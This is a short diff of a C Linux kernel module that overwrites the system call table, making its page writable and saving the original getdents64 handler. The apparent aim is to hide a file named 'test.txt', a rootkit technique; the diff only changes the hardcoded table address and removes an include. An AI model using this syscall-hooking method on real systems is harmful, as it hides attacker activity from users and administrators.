@@ -6,7 +6,6 @@
 #include <linux/semaphore.h>
 #include <linux/dirent.h>
 #include <asm/cacheflush.h>
-#include <stdint.h>
 
 #define FILE_NAME "test.txt"
 
@@ -66,7 +65,7 @@ int set_page_rw(unsigned long addr, int f) {
 }
 
 int f_init(void) {
-  sys_call_table = (void*)0xffffffff820013a0;
+  sys_call_table = (void*)0xffffffffb7c013a0;
 
   set_page_rw((uintptr_t)sys_call_table, 1);
   getdents64_original = sys_call_table[__NR_getdents64];
